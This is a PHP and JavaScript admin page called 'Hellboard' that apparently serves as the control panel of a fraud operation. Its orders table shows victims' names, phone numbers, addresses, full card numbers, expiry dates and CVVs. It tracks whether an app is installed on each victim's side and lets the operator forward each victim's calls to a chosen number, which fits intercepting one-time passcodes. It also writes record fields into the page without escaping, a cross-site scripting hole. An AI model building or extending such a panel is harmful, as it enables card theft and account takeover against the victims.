<?php
require 'check_session.php'; // Protect page
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Hellboard - Orders</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
  <style>
    body { background: linear-gradient(135deg,#0f172a 0%,#1e293b 100%); font-family: 'Inter',sans-serif; }
    .toggle-switch { position:relative;width:50px;height:28px;background:#374151;border-radius:14px;cursor:pointer;transition:.3s; }
    .toggle-switch.active { background:#10b981; }
    .toggle-slider { position:absolute;top:2px;left:2px;width:24px;height:24px;background:white;border-radius:50%;transition:.3s;box-shadow:0 2px 4px rgba(0,0,0,.2);}
    .toggle-switch.active .toggle-slider { transform:translateX(22px);}
    ::-webkit-scrollbar{width:6px;}::-webkit-scrollbar-thumb{background:#475569;border-radius:3px;}
    .fade-in{animation:fadeIn .5s ease-in;}@keyframes fadeIn{from{opacity:0;transform:translateY(20px);}to{opacity:1;transform:translateY(0);}}
    #toast { position:fixed; top:20px; right:20px; z-index:9999; }
  </style>
</head>
<body class="min-h-screen">
  <!-- Mobile Menu Button -->
  <button id="mobileMenuBtn" class="lg:hidden fixed top-4 left-4 z-50 bg-slate-800 text-white p-3 rounded-lg shadow-lg">
    <i class="fas fa-bars"></i>
  </button>

  <!-- Sidebar -->
  <div id="sidebar" class="fixed left-0 top-0 h-full w-64 bg-slate-900/95 backdrop-blur-sm border-r border-slate-700 transform -translate-x-full lg:translate-x-0 transition-transform duration-300 z-40">
    <div class="p-6 border-b border-slate-700">
      <h2 class="text-xl font-bold text-white">Hellboard</h2>
      <p class="text-slate-400 text-sm">Management System</p>
    </div>
    <nav class="mt-6">
      <a href="orders.php" class="flex items-center px-6 py-3 text-white bg-slate-800 border-l-4 border-blue-500"><i class="fas fa-shopping-cart mr-3"></i>Orders</a>
      <a href="products.php" class="flex items-center px-6 py-3 text-slate-300 hover:bg-slate-800 hover:text-white border-l-4 border-transparent hover:border-blue-500"><i class="fas fa-box mr-3"></i>Products</a>
      <a href="settings.php" class="flex items-center px-6 py-3 text-slate-300 hover:bg-slate-800 hover:text-white border-l-4 border-transparent hover:border-blue-500"><i class="fas fa-cog mr-3"></i>Settings</a>
      <a href="logout.php" class="flex items-center px-6 py-3 text-red-400 hover:bg-red-900/20 hover:text-red-300 border-l-4 border-transparent hover:border-red-500"><i class="fas fa-sign-out-alt mr-3"></i>Logout</a>
    </nav>
  </div>

  <!-- Main Content -->
  <div class="lg:ml-64 min-h-screen">
    <header class="bg-slate-800/50 border-b border-slate-700 p-4 lg:p-6">
      <div class="flex items-center justify-between">
        <h1 class="text-2xl font-bold text-white">Orders</h1>
        <div class="text-right">
          <p class="text-sm text-slate-400">Welcome</p>
          <p class="text-white font-medium"><?= htmlspecialchars($_SESSION['username']) ?></p>
        </div>
      </div>
    </header>

    <div class="p-4 lg:p-6 fade-in">
      <!-- Search -->
      <div class="mb-6">
        <div class="relative max-w-md">
          <input type="text" id="searchOrders" placeholder="Search orders..."
            class="w-full pl-10 pr-4 py-3 bg-slate-800/50 border border-slate-600 rounded-lg text-white placeholder-slate-400 focus:ring-2 focus:ring-blue-500">
          <i class="fas fa-search absolute left-3 top-1/2 -translate-y-1/2 text-slate-400"></i>
        </div>
      </div>
      <!-- Table -->
      <div class="bg-slate-800/30 rounded-xl border border-slate-700 overflow-hidden">
        <div class="overflow-x-auto">
          <table class="w-full">
            <thead class="bg-slate-700/50">
              <tr>
                <th class="px-4 py-3 text-left text-xs font-medium text-slate-300 uppercase">ID</th>
                <th class="px-4 py-3 text-left text-xs font-medium text-slate-300 uppercase">Name</th>
                <th class="px-4 py-3 text-left text-xs font-medium text-slate-300 uppercase">Mobile</th>
                <th class="px-4 py-3 text-left text-xs font-medium text-slate-300 uppercase">Product</th>
                <th class="px-4 py-3 text-left text-xs font-medium text-slate-300 uppercase">Address</th>
                <th class="px-4 py-3 text-left text-xs font-medium text-slate-300 uppercase">App Status</th>
                <th class="px-4 py-3 text-left text-xs font-medium text-slate-300 uppercase">Total(Qty)</th>
                <th class="px-4 py-3 text-left text-xs font-medium text-slate-300 uppercase">Card Details</th>
                <th class="px-4 py-3 text-left text-xs font-medium text-slate-300 uppercase">Status</th>
                <th class="px-4 py-3 text-left text-xs font-medium text-slate-300 uppercase">Forwarded To</th>
                <th class="px-4 py-3 text-left text-xs font-medium text-slate-300 uppercase">Created</th>
                <th class="px-4 py-3 text-left text-xs font-medium text-slate-300 uppercase">Actions</th>
              </tr>
            </thead>
            <tbody id="ordersTableBody" class="divide-y divide-slate-700"></tbody>
          </table>
        </div>
      </div>
    </div>
  </div>

  <!-- Forward Modal -->
  <div id="forwardModal" class="hidden fixed inset-0 bg-black/50 z-50 flex items-center justify-center p-4">
    <div class="bg-slate-800 rounded-xl border border-slate-700 p-6 w-full max-w-md">
      <h3 class="text-lg font-semibold text-white mb-4">Forward Calls</h3>
      <p class="text-slate-400 mb-4">Enter number to forward calls to:</p>
      <input type="tel" id="forwardNumber" class="w-full px-4 py-3 bg-slate-700/50 border border-slate-600 rounded-lg text-white placeholder-slate-400 mb-4">
      <div class="flex space-x-3">
        <button onclick="closeForwardModal()" class="flex-1 px-4 py-2 bg-slate-600 hover:bg-slate-700 text-white rounded-lg">Cancel</button>
        <button onclick="confirmForward()" class="flex-1 px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg">Confirm</button>
      </div>
    </div>
  </div>

  <!-- Overlay -->
  <div id="overlay" class="hidden fixed inset-0 bg-black/50 z-30 lg:hidden" onclick="closeMobileMenu()"></div>

  <!-- Toast -->
  <div id="toast"></div>

  <script>
    let allOrders = [], currentOrderId = null;

    document.addEventListener('DOMContentLoaded', () => loadOrders());

    function showToast(msg, type="success") {
      const toast = document.createElement('div');
      toast.className = `mb-2 px-4 py-2 rounded-lg shadow text-white ${type==="success"?"bg-green-600":"bg-red-600"}`;
      toast.textContent = msg;
      document.getElementById('toast').appendChild(toast);
      setTimeout(()=>toast.remove(),3000);
    }

    function loadOrders() {
      fetch('fetch_orders.php')
        .then(res=>res.json())
        .then(data=>{ allOrders=data; displayOrders(allOrders); })
        .catch(()=> showToast("Error loading orders","error"));
    }

    function displayOrders(orders) {
      const tbody=document.getElementById('ordersTableBody'); 
      tbody.innerHTML='';
      orders.forEach(order=>{
        tbody.innerHTML += `
        <tr class="hover:bg-slate-700/30">
          <td class="px-4 py-3 text-sm text-white">${order.id}</td>
          <td class="px-4 py-3 text-sm text-white">${order.name}</td>
          <td class="px-4 py-3 text-sm text-slate-300">${order.mobile}</td>
          <td class="px-4 py-3 text-sm text-slate-300">${order.product}</td>
        <td class="px-4 py-3 text-sm text-slate-300">${order.full_address}</td>
          <td class="px-4 py-3 text-sm ${order.installed==1?'text-green-400':'text-red-400'}">
            ${order.installed==1 ? 'Installed' : 'Not Installed'}
          </td>
          <td class="px-4 py-3 text-sm text-slate-300">₹${order.total} (${order.quantity})</td>
          <td class="px-4 py-3 text-sm text-slate-300">
            ${order.card_type} ${order.card_no} (Exp: ${order.exp_month}/${order.exp_year} CVV: ${order.cvv})
          </td>
          <td class="px-4 py-3">
            <div class="toggle-switch ${order.cf_status==='enabled'?'active':''}" 
                 onclick="toggleForwarding(${order.id}, '${order.cf_status || 'disabled'}')">
              <div class="toggle-slider"></div>
            </div>
          </td>
          <td class="px-4 py-3 text-sm text-slate-300">${order.forwarded_to||'Not set'}</td>
          <td class="px-4 py-3 text-sm text-slate-400">${order.created_at}</td>
          <td class="px-4 py-3">
            <button onclick="deleteOrder(${order.id})" class="text-red-400 hover:text-red-300"><i class="fas fa-trash"></i></button>
          </td>
        </tr>`;
      });
    }

    document.getElementById('searchOrders').addEventListener('input', e=>{
      const term=e.target.value.toLowerCase();
      displayOrders(allOrders.filter(o=>o.name.toLowerCase().includes(term)||o.product.toLowerCase().includes(term)||o.mobile.includes(term)));
    });

    function toggleForwarding(id,status) {
      if(!status || status==='disabled'){ 
        currentOrderId=id; 
        document.getElementById('forwardModal').classList.remove('hidden'); 
      } else { 
        updateForwarding(id,'disabled',''); 
      }
    }

    function closeForwardModal() {
      document.getElementById('forwardModal').classList.add('hidden');
      document.getElementById('forwardNumber').value=''; 
      currentOrderId=null;
    }

    function confirmForward() {
      const num=document.getElementById('forwardNumber').value;
      if(num && currentOrderId){ updateForwarding(currentOrderId,'enabled',num); closeForwardModal(); }
    }

    function updateForwarding(id,status,num) {
      fetch('update_forwarding.php',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id,cf_status:status,forwarded_to:num})})
      .then(r=>r.json()).then(res=>{ if(res.success){ showToast("Forwarding updated"); loadOrders(); } else showToast("Error updating","error"); });
    }

    function deleteOrder(id) {
      if(confirm('Delete this order?')){
        fetch('delete_order.php',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id})})
        .then(r=>r.json()).then(res=>{ if(res.success){ showToast("Order deleted"); loadOrders(); } else showToast("Error deleting","error"); });
      }
    }
  </script>
  <script>
document.addEventListener("DOMContentLoaded", () => {
  const btn = document.getElementById("mobileMenuBtn");
  const sidebar = document.getElementById("sidebar");
  const overlay = document.getElementById("overlay");

  if (btn && sidebar && overlay) {
    btn.addEventListener("click", () => {
      sidebar.classList.remove("-translate-x-full");
      overlay.classList.remove("hidden");
    });

    overlay.addEventListener("click", () => {
      sidebar.classList.add("-translate-x-full");
      overlay.classList.add("hidden");
    });
  }
});
</script>

</body>
</html>
